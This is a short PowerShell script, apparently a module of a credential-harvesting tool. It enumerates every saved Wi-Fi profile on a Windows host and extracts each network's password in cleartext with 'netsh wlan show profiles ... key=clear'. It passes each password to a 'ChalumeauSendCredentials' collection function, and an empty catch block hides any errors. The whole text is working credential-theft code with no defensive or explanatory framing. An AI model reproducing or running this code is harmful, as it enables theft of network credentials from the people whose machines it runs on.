try
{
$WIFIAccounts = New-Object System.Collections.ArrayList
$WIFIPROF = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
$WIFIDUMP = foreach($network in $WIFIPROF) {
    $password = (netsh wlan show profiles name=$network key=clear | Select-String 'Key Content') -replace ".*:\s+"
    if($network -notcontains "wlan show profiles."){
        ChalumeauSendCredentials -Secret $password -Username $network -IsClearText 1 -source "wifi password"        
    }

}
}catch{}